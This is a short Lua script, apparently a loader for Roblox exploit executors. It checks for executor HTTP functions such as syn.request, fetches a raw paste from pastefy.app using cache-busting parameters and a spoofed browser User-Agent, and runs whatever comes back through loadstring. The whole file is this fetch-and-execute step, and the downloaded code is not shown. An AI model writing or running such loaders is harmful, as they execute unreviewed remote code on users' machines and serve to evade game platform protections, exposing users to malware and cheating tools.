local url="https://pastefy.app/ZM7P7gM2/raw"
local fn=(syn and syn.request) or (http and http.request) or http_request or request
local body
if fn then
    local ok,res=pcall(fn,{
        Url=url.."?v="..tick()..math.random(1,999999),
        Method="GET",
        Headers={
            ["Cache-Control"]="no-cache, no-store, must-revalidate",
            ["Pragma"]="no-cache",
            ["Expires"]="0",
            ["User-Agent"]="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
    })
    if ok and res and res.Body and #res.Body>50 then body=res.Body end
end
if not body then
    local ok2,b=pcall(function() return game:HttpGet(url.."?v="..tick()..math.random(1,999999), true) end)
    if ok2 and b and #b>50 then body=b end
end
if body then
    loadstring(body)()
end